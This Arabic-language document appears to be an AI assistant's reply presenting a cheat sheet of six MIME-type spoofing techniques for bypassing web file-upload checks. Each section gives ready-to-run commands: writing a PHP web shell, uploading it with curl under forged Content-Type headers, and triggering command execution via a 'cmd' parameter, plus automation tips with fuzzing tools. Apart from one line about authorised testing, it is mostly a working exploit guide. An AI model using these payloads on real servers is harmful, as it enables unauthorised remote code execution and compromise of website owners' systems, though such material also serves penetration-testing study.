
## جميع المحاولات الممكنة للتلاعب بنوع MIME

فيما يلي قائمة شاملة بجميع التقنيات الممكنة للتلاعب بنوع MIME، مقسمة إلى فئات مع شرح كل تقنية، كيف تعمل، متى تُستخدم، والأوامر المرتبطة بها.

```
<?php system($_GET['cmd']); ?>
```

### 1. تغيير Content-Type إلى نوع صورة شائع
**شرح**: تغيير رأس Content-Type إلى نوع صورة مسموح (مثل image/jpeg) لتحميل ملف PHP أو ASP كصورة.
**كيف يعمل**: الخادم قد يقبل الملف بناءً على رأس Content-Type دون فحص المحتوى الفعلي.
**متى يُستخدم؟**: عندما يعتمد الخادم على التحقق من نوع MIME فقط.
**المحاولات**:
- Content-Type: image/jpeg
- Content-Type: image/png
- Content-Type: image/gif
**الأوامر**:
- إنشاء ويب شيل:
  ```bash
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  ```
- إرسال الطلب باستخدام curl:
  ```bash
  curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

### 2. استخدام Content-Type عام (Generic)
**شرح**: استخدام نوع MIME عام مثل application/octet-stream لتحميل ملف خبيث، حيث قد يقبل الخادم هذا النوع كبديل غير مقيد.
**كيف يعمل**: بعض الخوادم لا تفرض أنواع MIME محددة، مما يسمح بقبول أنواع عامة.
**متى يُستخدم؟**: عندما لا يكون الخادم صارمًا في التحقق من أنواع MIME المحددة.
**المحاولات**:
- Content-Type: application/octet-stream
- Content-Type: application/x-www-form-urlencoded
**الأوامر**:
- إرسال الطلب:
  ```bash
  curl -X POST -H "Content-Type: application/octet-stream" -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

### 3. إضافة رؤوس Content-Type متعددة
**شرح**: إرسال رأسي Content-Type في نفس الطلب، أحدهما غير مسموح (مثل application/x-php) والآخر مسموح (مثل image/jpeg).
**كيف يعمل**: بعض الخوادم قد تقرأ رأس Content-Type الأخير فقط أو تتجاهل الأول، مما يسمح بتحميل الملف.
**متى يُستخدم؟**: عند وجود معالجة غير متسقة لرؤوس HTTP.
**المحاولات**:
- Content-Type: application/x-php متبوعًا بـ Content-Type: image/jpeg
- Content-Type: text/php متبوعًا بـ Content-Type: image/png
**الأوامر**:
- إرسال الطلب باستخدام curl:
  ```bash
  curl -X POST -H "Content-Type: application/x-php" -H "Content-Type: image/jpeg" -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

### 4. استخدام أنواع MIME غير قياسية
**شرح**: استخدام أنواع MIME غير شائعة أو غامضة قد لا تكون محظورة بواسطة فلاتر الخادم.
**كيف يعمل**: الخوادم قد تسمح بأنواع غير مدرجة في قوائم الحظر أو تتعامل معها كأنواع مسموحة افتراضيًا.
**متى يُستخدم؟**: عندما يحظر الخادم أنواعًا شائعة فقط (مثل application/x-php) ولكنه يسمح بأنواع أخرى.
**المحاولات**:
- Content-Type: text/plain
- Content-Type: application/zip
- Content-Type: application/pdf
- Content-Type: text/x-php
**الأوامر**:
- إرسال الطلب:
  ```bash
  curl -X POST -H "Content-Type: text/plain" -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

### 5. إزالة رأس Content-Type
**شرح**: إزالة رأس Content-Type من طلب التحميل بالكامل، مما قد يؤدي إلى تجاوز التحقق إذا كان الخادم لا يتطلب هذا الرأس.
**كيف يعمل**: بعض الخوادم لا تتحقق من وجود Content-Type وتعتمد على الامتداد أو المحتوى فقط.
**متى يُستخدم؟**: عندما لا يفرض الخادم وجود رأس Content-Type.
**المحاولات**:
- إرسال طلب بدون Content-Type.
**الأوامر**:
- إرسال الطلب:
  ```bash
  curl -X POST -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

### 6. استخدام Content-Type لتطبيقات أخرى
**شرح**: استخدام أنواع MIME مرتبطة بتطبيقات أخرى (مثل application/xml أو text/html) قد تكون مسموحة أو غير مفحوصة.
**كيف يعمل**: الخادم قد يقبل أنواعًا غير متوقعة إذا لم تكن مدرجة في قائمة الحظر.
**متى يُستخدم؟**: عندما يسمح الخادم بأنواع غير صورية أو عند اختبار سياقات غير قياسية.
**المحاولات**:
- Content-Type: application/xml
- Content-Type: text/html
- Content-Type: application/json
**الأوامر**:
- إرسال الطلب:
  ```bash
  curl -X POST -H "Content-Type: application/xml" -F "file=@shell.php" http://<target>/upload
  ```
- اختبار التنفيذ:
  ```bash
  curl 'http://<target>/Uploads/shell.php?cmd=whoami'
  ```

---

## ملخص جميع الأوامر لكل تقنية

1. **تغيير Content-Type إلى نوع صورة شائع**:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

2. **استخدام Content-Type عام**:
   ```bash
   curl -X POST -H "Content-Type: application/octet-stream" -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

3. **إضافة رؤوس Content-Type متعددة**:
   ```bash
   curl -X POST -H "Content-Type: application/x-php" -H "Content-Type: image/jpeg" -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

4. **استخدام أنواع MIME غير قياسية**:
   ```bash
   curl -X POST -H "Content-Type: text/plain" -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

5. **إزالة رأس Content-Type**:
   ```bash
   curl -X POST -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

6. **استخدام Content-Type لتطبيقات أخرى**:
   ```bash
   curl -X POST -H "Content-Type: application/xml" -F "file=@shell.php" http://<target>/upload
   curl 'http://<target>/Uploads/shell.php?cmd=whoami'
   ```

---

## نصائح إضافية
- **استخدام أدوات الوكيل**: استخدم Burp Suite أو OWASP ZAP لتعديل رؤوس Content-Type بسهولة أثناء التحميل.
- **دمج مع تقنيات أخرى**: ادمج التلاعب بنوع MIME مع تجاوز الامتدادات (مثل shell.php.jpg) أو إضافة بايتات سحرية (مثل \x89PNG).
- **اختبار أنواع متعددة**: جرب قائمة أنواع MIME من مصادر مثل SecLists/web-all-content-types.txt:
  ```bash
  curl -X POST -H "Content-Type: $(cat content-types.txt)" -F "file=@shell.php" http://<target>/upload
  ```
- **أتمتة الاختبار**: استخدم Fuxploider لاختبار أنواع MIME متعددة:
  ```bash
  python3 fuxploider.py --url http://<target>/upload --extensions php --content-type image/jpeg
  ```
- **التحقق من التنفيذ**: تحقق دائمًا من تنفيذ الملف عبر curl أو المتصفح.
- **الاختبار بمسؤولية**: اختبر فقط على أهداف مُصرح بها (مثل بيئات مختبرية أو برامج مكافآت الأخطاء).

إذا كنت تريد شرح خطوة أخرى (مثل Manipulate Magic Bytes أو Exploit Configuration Files) بنفس الأسلوب، أو تركيزًا على نوع خادم معين، أخبرني وسأقدم ردًا مخصصًا!